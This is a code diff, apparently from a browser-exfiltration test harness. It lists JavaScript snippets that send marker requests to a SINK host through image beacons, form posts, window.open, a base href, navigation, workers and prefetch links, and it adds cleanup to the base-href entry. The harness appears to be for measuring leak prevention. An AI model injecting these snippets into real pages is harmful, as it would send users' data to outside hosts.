@@ -178,7 +178,13 @@ _CHANNELS: list[tuple[str, str]] = [
     ("image beacon", "(() => { const i = new Image(); i.src = SINK + '/img-MARKER' })()"),
     ("form post", "(() => { const f = document.createElement('form'); f.method = 'POST'; f.action = SINK + '/form-MARKER'; document.body.appendChild(f); try { f.submit() } catch (e) {} })()"),
     ("window.open", "try { window.open(SINK + '/open-MARKER') } catch (e) {}"),
-    ("base href", "(() => { const b = document.createElement('base'); b.href = SINK + '/base-MARKER/'; document.head.appendChild(b); const i = new Image(); i.src = 'relative-MARKER' })()"),
+    # Cleans up after itself: a <base> left in the document re-points every
+    # relative URL built afterwards, so the next channel to use one would report
+    # a leak that is really this channel's residue. Measured — the element
+    # survives and `new URL('x', document.baseURI)` resolves to the sink. No
+    # current payload is relative, so nothing is wrong today; the removal is
+    # what keeps that true when one is added.
+    ("base href", "(() => { const b = document.createElement('base'); b.href = SINK + '/base-MARKER/'; document.head.appendChild(b); const i = new Image(); i.src = 'relative-MARKER'; setTimeout(() => b.remove(), 300) })()"),
     ("self-navigation", "try { location.href = SINK + '/nav-MARKER' } catch (e) {}"),
     ("worker", "try { new Worker(URL.createObjectURL(new Blob([\"fetch('\" + SINK + \"/worker-MARKER')\"], {type: 'text/javascript'}))) } catch (e) {}"),
     ("prefetch", "(() => { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = SINK + '/prefetch-MARKER'; document.head.appendChild(l) })()"),
